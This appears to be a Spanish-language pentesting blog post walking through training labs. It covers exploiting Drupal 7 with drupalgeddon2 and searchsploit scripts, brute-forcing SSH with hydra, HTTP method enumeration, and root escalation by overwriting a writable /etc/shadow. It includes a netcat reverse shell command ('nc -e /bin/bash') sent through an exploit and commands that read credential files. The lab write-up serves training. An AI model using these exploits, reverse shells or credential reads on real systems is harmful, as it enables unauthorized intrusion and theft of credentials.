---
title: "Resolución de Laboratorios"
date: 2026-05-05 21:17:00 -0500
categories: [Pentesting, Windows Security, Post-Exploitation]
tags: [Metasploit, BadBlue, Pivoting, RDP, Privilege Escalation, Hydra, SSH, Meterpreter, msfvenom]
description: "Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows."
image:
  path: /assets/img/Primer-Blog/escalacion-privilegios.png
  alt: "Explotación y Post Explotación Labs"
toc: true
---

En este blog se tratarán varios laboratorios que servirán para aplicar lo aprendido, entre ellos se tienen una serie de máquinas y vamos a detallar una a una el paso a seguir

## Ejercicio 1 - DRUPAL
Para este laboratorio se nos entregó una OVA la cual viene comprimida en formato .zip, con una contraseña, la cuál no la tenemos. El primer paso es tratar de descifrar mediante fuerza bruta la contraseña de este archivo.
```shell
fcrackzip -v -u -D -P /usr/share/wordlists/rockyou.txt EQUIPO\ 1\ ejpt.zip
```
Luego de haber encontrado la clave del zip, se descomprime y se procede a levantar la máquina virtual.
Al tener la máquina levantada, se requiere saber qué dirección ip fue la que obtuvo.
```shell
sudo arp-scan --localnet
```
Al encontrar la ip se procede a realizar el escaneo de puertos
```shell
nmap -p- -sVC -Pn ip
```
Al revisar que la máquina tiene el puerto 80 levantado, se procede a entrar a la dirección ip desde el navegador y nos encontramos con un DRUPAL 7.
Para saber la versión exacta de drupal podemos consultar en internet, cómo saber la versión exacta de drupal y se encuentra que es DRUPAL v 7.57.
```shell
search drupal 7.57
msfconsole -q
use /unix/webapp/drupal_drupalgeddon2/
  show options
  set lport 4545
  set RHOSTS ip
  run
```
> **Tip Profesional:** En ciertos casos es necesario configurar el TARGETURI, todo depende del directorio en el cuál se encuentre el servicio.
{: .prompt-info }

Al correr msfconsole se logra levantar una sesión
```shell
meterpreter> getuid #Para saber quienes somos
meterpreter> shell
  ip a
  /bin/bash -i
```
Si se encuentra una ip con dos interfaces, es que necesitamos hacer un pivoting. En este caso solo vamos a revisar credenciales para escalar privilegios

```shell
cd sites/default
cat settings.php
```
En el archivo settings se puede encontrar todas las credenciales de conexión para la base de datos.

```shell
netstat
netstat -ano
cat /etc/passwd
```

Al recuperar nombres de usuarios, se puede hacer un ataque de fuerza bruta con lo siguiente:
```shell
hydra -l flag4 -P /usr/share/wordlists/rockyou.txt  ip
ssh usuario@ip
```
Con esto se obtiene una shell y podemos conectarnos a la base de datos
```shell
mysql -u dbuser -p
  show databases;
  use drupaldb;
  show tables;
  SELECT * FROM users;
  UPDATE users set pass =md5(`password`) where name=`prueba1`;
```
Para descifrar el tipo de hash que posee las contraseñas, se puede copiar el hash, guardar en un archivo te texto y con lo siguiente se sabe que hash es
```shell
john hash.txt
```
Adicional de decirnos el tipo de hash, nos arroja la clave del usuario. Con esto ya podemos iniciar sesión en la página de drupal y revisar lo que tiene Drupal.

Con esto se finaliza este laboratorio de DRUPAL.

## Ejercicio 2 - DRUPAL Forma 2
Como es un ejercicio similar al anterior, nos saltamos ciertos pasos
```shell
searchsploit drupal 7
  Drupalgedon SQL Inyection (Add Admin User)
searchsploit -m 34992
```

Se debe abrir el mirror copiado para ver cómo ejecutar el script.
```shell
python2 34992.py -t https://ip -u USER -p PASSWORD
```
El resultado del scriipt fue exitoso, por lo que se procede a probar iniciando sesión en DRUPAL.

Ahora buscamos otra forma de acceder a Drupal.
```shell
searchsploit drupal 7
searchsploit -m 44448

python2 44448.py 
  http://ip
```
Otra forma es acceder a google y buscar **drupalggedon2 github pythone** se copia y se pega en un fichero.py

```shell
nano exdrupal.py
python2 exdrupal.py -h http://ip/ -c  'whoami'
```

De cualquiera de las dos formas se logra acceder al equipo pero como www-data. con ayuda del script ya podemos sacar la shell
```shell
# Dejar puerto escucha
nc -lnvp 4593
#Lanzar el comando
python2 exdrupal.py -h http://ip/ -c  'nc -e /bin/bash ip 4593'
```

Con esto ya se logró acceder al equipo.
> **Tip Profesional:** Si el comando anterior obtenido de msfvenom no funciona, se puede ocupar nc mkfifo. **nc -e** Funciona para versiones más actuales. **nc mkfifo** funciona para versiones antiguas.
{: .prompt-info }

Cuando la shell no es muy interactiva, se puede hacer un tratamiento de la shell para que sea más interactiva
```shell
script /dev/null -c bash
  Contrl+Z
stty raw -echo;fg
  reset
    xterm
export SHELL=bash TERM=xterm

stty rows 28 columns 130

#Ahora para que se mejore la vista en nueva terminal
stty -a
  rows:  28; columns 130 
```

Con esto se finaliza el Laboratorio y lo más importante es encontrar la versión exacta de la vulnerabilidad, revisar archivos de configuración de la base de datos y finalmente el tratamiento de la shell.

## HTTP Method Enumeration 
Para enviar un GEt Request se utiliza el siguiente comando
```shell
curl -x GET dominio.local
```
Enviar un HEAD Request
```shell
curl -I dominio.local
```
Enviar OPTIONS Request -> Permite saber que métodos tienen habilitados.
```shell
curl -X OPTIONS dominio.local -v
```
Comandos para probar los métodos
```shell
curl -X POST dominio.local
curl -XPUT dominio.local
```
Interactuando con el método login.php CURL
```shell
curl -X OPTIONS dominio.local/login.php -v
curl -X POST dominio.local/login.php -d "name=john&password=password" -v
```
Con estos comandos se puede revisar los métodos de autenticación que tenemos en los sitios web.

## Permision Matter
En este entorno de laboratorio, se te proporcionará acceso GUI (interfaz gráfica) a una máquina Kali. Se proporciona un acceso de terminal a la máquina objetivo en dominio.local:8000, al cual puedes acceder a través del navegador en Kali.

Objetivo: ¡Tu misión es obtener una shell de root en la máquina y recuperar la bandera (flag)!
```shell
ping dominio.local
nmap dominio.local
```
Desde el navegador se accede a dominio.local:8000 en donde obtenemos una shell.
```shell
ls -l /etc/passwd #Este archivo nunca debe tener permisos de escritura
ls -l /etc/shadow
cat /etc/shadow

find / -not -type l -perm -o+w
```
El comando find busca cualquier archivo que no sea de tipo link simbólico con los permisos escritura habilitado para otros usuarios.
```shell
openssl passwd -q hola
vi /etc/shadow
i #en root modificamos el hash que nos dio ssl
Esc
:wq
```
Luego de haber modifiado el archivo root se accede mediante ssh
```shell
su root
  hola
# Accedemos como root.
```
Con esto ya se logró acceder al equipo.
> **Tip Profesional:** Aprender a utilizar vi o vim en caso que nano esté deshabilitado.
{: .prompt-info }
